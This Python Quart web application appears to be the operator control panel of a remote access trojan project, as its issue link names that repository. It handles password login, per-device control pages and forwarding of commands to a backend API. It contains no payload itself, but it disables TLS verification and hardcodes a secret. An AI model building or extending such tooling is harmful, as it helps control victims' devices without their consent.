__author__ = "Zhao Bokai"
__license__ = "GPL v3"

from quart import Quart, redirect, url_for, request, make_response, render_template, jsonify, websocket
import asyncio
import rich
from sys import exit
import logging
import requests

import rich.traceback 

# Configure Rich traceback functionality
rich.traceback.install(show_locals=True)

# Basic configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
app = Quart(__name__)
WEB_HOST = "0.0.0.0"
WEB_PORT = 8000
API_SITE = 'http://localhost:5000'
SECURITY_PATH = 'fuck'  # Security path
SECURITY_PASSWORD_HASH = '6ac3c336e4094835293a3fed8a4b5fedde1b5e2626d9838fed50693bba00af0e'  # Password hash

# Global variables
url_root = f'{API_SITE}/{SECURITY_PATH}'  # API root URL

# Security verification function
def check(cookie):
    """Verify if user cookie is valid"""
    if requests.post(f"{url_root}/function", verify=False, cookies=cookie).status_code == 401:
        return False
    return True

# Home page route
@app.route(f'/{SECURITY_PATH}/')
async def index():
    """Display homepage, requires verification"""
    if not check(request.cookies): 
        return redirect(url_for('login'))
    return await render_template('index.html')

# Login route
@app.route(f'/{SECURITY_PATH}/login', methods=['GET', 'POST'])
async def login():
    """Handle user login"""
    global headers
    if request.method == 'POST':
        form = await request.form
        password = form.get('password', '')
        response = requests.post(f"{url_root}/verify", json={"password": password})
        if "Cookie" in response.json():
            resp = await make_response(redirect(url_for('index')))
            resp.set_cookie('Cookie', response.json()["Cookie"])
            return resp
        return await render_template('login.html', error='Incorrect password')
    return await render_template('login.html')

# Logout route
@app.route(f'/{SECURITY_PATH}/logout')
async def logout():
    """Handle user logout"""
    resp = await make_response(redirect(url_for('index')))
    resp.delete_cookie('Cookie')
    return resp

# Device page route
@app.route(f'/{SECURITY_PATH}/device/<id>')
async def device(id):
    """Display device control page"""
    if not check(request.cookies): 
        return redirect(url_for('login'))
    return await render_template('device.html', id=id, url_root=url_root)

# API request forwarding route
@app.route(f'/{SECURITY_PATH}/requests_to_function', methods=['POST'])
async def requests_to_function():
    """Forward API requests to backend service"""
    if not check(request.cookies): 
        return redirect(url_for('login'))
    json = await request.json
    response = requests.post(f"{url_root}/function", json=json, verify=False, cookies=request.cookies)
    return jsonify(response.json())

# Main program entry
async def main():
    """Start Web service"""
    logging.info("Starting program...")
    await asyncio.gather(
        app.run_task(host=WEB_HOST, port=WEB_PORT)
    )

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        logging.info("Copyright: Copyright © Zhao Bokai, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.warning("Program manually interrupted by user.")
        exit()
    except Exception as e:
        logging.error(f"Error: {e}, please report to [link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]")
